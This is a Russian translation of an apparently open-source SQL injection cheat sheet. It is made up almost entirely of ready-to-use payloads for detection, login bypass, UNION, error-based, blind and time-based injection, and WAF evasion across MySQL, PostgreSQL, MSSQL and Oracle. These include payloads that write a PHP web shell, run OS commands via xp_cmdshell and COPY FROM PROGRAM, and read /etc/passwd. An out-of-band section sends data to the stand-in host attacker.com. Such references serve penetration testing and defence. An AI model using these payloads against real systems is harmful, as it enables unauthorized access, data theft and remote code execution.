<a id="-sql-injection-payloads"></a>
# 💉 Полезные нагрузки для SQL-инъекций

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../SQLi.md)

> **Уточнение к оригиналу.** Синтаксис, типы выражений, права и число столбцов зависят от СУБД и контекста запроса; примеры не универсальны. В [MySQL после `--` нужен пробельный или управляющий символ](https://dev.mysql.com/doc/refman/8.0/en/comments.html), поэтому некоторые сохранённые строки требуют учёта продолжения исходного запроса. Многоточия внутри примеров — инструкции автора, а не исполняемый SQL; они переведены. Операции чтения, записи и внешнего взаимодействия требуют соответствующих прав и настроек.

[🇹🇷 Türkçe Sürüm](SQLi.tr.md) • [🇬🇷 Ελληνικά](SQLi.el.md)

```
  ███████╗ ██████╗ ██╗     ██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██║     ██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗██║   ██║██║     ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║██║▄▄ ██║██║     ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║╚██████╔╝███████╗██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Полезные нагрузки для обнаружения](#-detection-payloads)
- [Обход аутентификации](#-authentication-bypass)
- [Инъекция с UNION](#-union-based-injection)
- [Инъекция на основе ошибок](#-error-based-injection)
- [Слепая SQL-инъекция](#-blind-sql-injection)
- [Инъекция с задержкой](#-time-based-injection)
- [Особенности СУБД](#-dbms-specific)
- [Обход WAF](#-waf-bypass)
- [Внешний канал (out-of-band)](#-out-of-band)

---

<a id="-detection-payloads"></a>
## 🔍 Полезные нагрузки для обнаружения

<a id="basic-detection"></a>
### Базовое обнаружение

```sql
'
"
`
')
")
`)
'))
"))
`))

-- comment
/* comment */
# comment (MySQL)
```

<a id="boolean-detection"></a>
### Обнаружение по логическим условиям

```sql
' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
" OR "1"="1
" OR 1=1 --
' OR 'x'='x
' OR ''='
') OR ('1'='1
') OR ('x'='x
1' OR '1'='1
1" OR "1"="1
```

<a id="arithmetic-detection"></a>
### Обнаружение арифметическими выражениями

```sql
' OR 1=1--
' OR 1=2--
' AND 1=1--
' AND 1=2--
1 OR 1=1
1 AND 1=1
1 AND 1=2
```

<a id="string-concatenation"></a>
### Конкатенация строк

```sql
' || 'test
' + 'test
' 'test
```

---

<a id="-authentication-bypass"></a>
## 🔓 Обход аутентификации

<a id="login-bypass"></a>
### Обход входа

```sql
admin' --
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR '1'='1--
') OR ('1'='1--
' OR ''='
' OR 1=1-- -
```

<a id="username-field"></a>
### Поле имени пользователя

```sql
admin'--
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'/*
admin' OR 1=1--
admin'/*
```

<a id="password-field"></a>
### Поле пароля

```sql
' OR '1'='1
' OR ''='
' OR 1=1--
anything' OR '1'='1
```

<a id="common-bypass-combinations"></a>
### Распространённые сочетания для обхода

```sql
Username: admin'--
Password: anything

Username: ' OR 1=1--
Password: anything

Username: admin
Password: ' OR '1'='1

Username: ' OR '1'='1' --
Password: ' OR '1'='1' --
```

---

<a id="-union-based-injection"></a>
## 🔗 Инъекция с UNION

<a id="finding-columns"></a>
### Определение числа столбцов

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...продолжать до появления ошибки...

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

<a id="basic-union"></a>
### Базовый UNION

```sql
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
```

<a id="data-extraction"></a>
### Извлечение данных

```sql
-- MySQL
' UNION SELECT user(),database()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--

-- PostgreSQL
' UNION SELECT current_user,version()--
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- MSSQL
' UNION SELECT @@version,NULL--
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--

-- Oracle
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT table_name,NULL FROM all_tables--
```

<a id="union-with-comments"></a>
### UNION с комментариями

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3#
' UNION SELECT 1,2,3/*
' UNION SELECT 1,2,3;%00
```

---

<a id="-error-based-injection"></a>
## ⚠️ Инъекция на основе ошибок

<a id="mysql-error-based"></a>
### Обнаружение по ошибкам MySQL

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--

' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--

' AND EXP(~(SELECT * FROM (SELECT version())x))--
```

<a id="mssql-error-based"></a>
### Обнаружение по ошибкам MSSQL

```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

' AND 1=(SELECT TOP 1 CAST(username AS int) FROM users)--
```

<a id="postgresql-error-based"></a>
### Обнаружение по ошибкам PostgreSQL

```sql
' AND 1=CAST((SELECT version()) AS int)--

' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
```

<a id="oracle-error-based"></a>
### Обнаружение по ошибкам Oracle

```sql
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--

' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

---

<a id="-blind-sql-injection"></a>
## 🔮 Слепая SQL-инъекция

<a id="boolean-based-blind"></a>
### Слепая инъекция по логическим условиям

```sql
-- Истинное условие
' AND 1=1--
' AND 'a'='a'--

-- Ложное условие
' AND 1=2--
' AND 'a'='b'--

-- Извлечение символов
' AND SUBSTRING(username,1,1)='a'--
' AND SUBSTRING((SELECT database()),1,1)='t'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100--
```

<a id="binary-search"></a>
### Двоичный поиск

```sql
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>112--
...сужать диапазон до точного символа...
```

<a id="length-detection"></a>
### Определение длины

```sql
' AND LENGTH(database())>1--
' AND LENGTH(database())>5--
' AND LENGTH(database())=7--
```

<a id="tablecolumn-enumeration"></a>
### Перечисление таблиц и столбцов

```sql
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--

' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'--
```

---

<a id="-time-based-injection"></a>
## ⏱️ Инъекция с задержкой

<a id="mysql"></a>
### MySQL

```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--

1' AND (SELECT SLEEP(5) FROM dual WHERE database() LIKE 't%')--
```

<a id="postgresql"></a>
### PostgreSQL

```sql
'; SELECT pg_sleep(5)--
' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END)--
' || pg_sleep(5)--
```

<a id="mssql"></a>
### MSSQL

```sql
'; WAITFOR DELAY '0:0:5'--
' AND 1=1 WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

<a id="oracle"></a>
### Oracle

```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND 1=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)--
```

---

<a id="-dbms-specific"></a>
## 🗄️ Особенности СУБД

<a id="mysql-payloads"></a>
### Полезные нагрузки MySQL

```sql
-- Версия
' UNION SELECT @@version--
' UNION SELECT version()--

-- Текущий пользователь
' UNION SELECT user()--
' UNION SELECT current_user()--

-- База данных
' UNION SELECT database()--

-- Таблицы
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- Столбцы
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Прочитать файл
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- Записать файл
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
```

<a id="postgresql-payloads"></a>
### Полезные нагрузки PostgreSQL

```sql
-- Версия
' UNION SELECT version()--

-- Текущий пользователь
' UNION SELECT current_user--

-- База данных
' UNION SELECT current_database()--

-- Таблицы
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--

-- Прочитать файл
' UNION SELECT pg_read_file('/etc/passwd')--

-- Выполнение команд
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';--
```

<a id="mssql-payloads"></a>
### Полезные нагрузки MSSQL

```sql
-- Версия
' UNION SELECT @@version--

-- Текущий пользователь
' UNION SELECT SYSTEM_USER--

-- База данных
' UNION SELECT DB_NAME()--

-- Таблицы
' UNION SELECT name FROM sysobjects WHERE xtype='U'--

-- Выполнение команд
'; EXEC xp_cmdshell 'whoami';--

-- Включить xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

<a id="oracle-payloads"></a>
### Полезные нагрузки Oracle

```sql
-- Версия
' UNION SELECT banner FROM v$version WHERE rownum=1--

-- Текущий пользователь
' UNION SELECT user FROM dual--

-- База данных
' UNION SELECT ora_database_name FROM dual--

-- Таблицы
' UNION SELECT table_name FROM all_tables--

-- Столбцы
' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--
```

---

<a id="-waf-bypass"></a>
## 🛡️ Обход WAF

<a id="space-bypass"></a>
### Обход фильтра пробелов

```sql
'/**/OR/**/1=1--
' OR/**/1=1--
'%09OR%091=1--
'%0AOR%0A1=1--
'%0COR%0C1=1--
'%0DOR%0D1=1--
'+OR+1=1--
```

<a id="comment-bypass"></a>
### Обход с помощью комментариев

```sql
/*!50000SELECT*/ * FROM users
SELECT/**_**/ * FROM users
SELECT%0a* FROM users
```

<a id="case-variation"></a>
### Изменение регистра

```sql
' uNiOn SeLeCt 1,2,3--
' UnIoN sElEcT 1,2,3--
```

<a id="encoding"></a>
### Кодирование

```sql
-- URL-кодирование
%27%20OR%201=1--
%27%20UNION%20SELECT%201,2,3--

-- Двойное URL-кодирование
%2527%20OR%201=1--

-- Шестнадцатеричное кодирование
' UNION SELECT 0x61646d696e--  (admin в hex)
```

<a id="keyword-bypass"></a>
### Обход фильтра ключевых слов

```sql
-- Обход фильтра UNION
' UNION ALL SELECT
' /*!UNION*/ SELECT
' UN/**/ION SE/**/LECT

-- Обход фильтра SELECT
' UNION SEL/**/ECT
' UNION%0ASELECT
' UNION(SELECT)

-- Обход фильтра AND/OR
' && 1=1--
' || 1=1--
' %26%26 1=1--
' -1 || 1=1--
```

<a id="hpp-http-parameter-pollution"></a>
### HPP (загрязнение HTTP-параметров)

```
?id=1&id=' OR '1'='1
?id=1/*&id=*/' OR '1'='1
```

---

<a id="-out-of-band"></a>
## 📡 Внешний канал (out-of-band)

<a id="mysql-oob"></a>
### MySQL OOB

```sql
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))
SELECT * INTO OUTFILE '\\\\attacker.com\\share\\output.txt'
```

<a id="mssql-oob"></a>
### MSSQL OOB

```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; EXEC master..xp_fileexist '\\attacker.com\share'--
```

<a id="postgresql-oob"></a>
### PostgreSQL OOB

```sql
CREATE EXTENSION dblink; SELECT dblink_connect('host=attacker.com user=test password=test dbname=test')
```

<a id="oracle-oob"></a>
### Oracle OOB

```sql
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||version) FROM dual
SELECT HTTPURITYPE('http://attacker.com/'||version).GETCLOB() FROM dual
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="detection-order"></a>
### Порядок обнаружения

1. `'` - Одинарная кавычка
2. `"` - Двойная кавычка
3. `' OR '1'='1` - Инъекция по логическим условиям
4. `' AND SLEEP(5)--` - На основе задержки
5. `' UNION SELECT NULL--` - На основе UNION

<a id="common-endpoints"></a>
### Распространённые конечные точки

```
- Формы входа
- Поля поиска
- Идентификаторы пользователей в URL
- Значения cookies
- HTTP-заголовки (User-Agent, Referer)
- Параметры API
```

<a id="sql-comments-by-dbms"></a>
### SQL-комментарии в разных СУБД

| DBMS | Комментарии |
|------|----------|
| MySQL | `-- `, `#`, `/* */` |
| PostgreSQL | `-- `, `/* */` |
| MSSQL | `-- `, `/* */` |
| Oracle | `-- `, `/* */` |

---

<a id="-resources"></a>
## 📚 Ресурсы

- [SQL-инъекции PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

<p align="center">
  <b>💉 Набор полезных нагрузок SQL-инъекции</b><br>
  <i>Только в образовательных целях!</i>
</p>
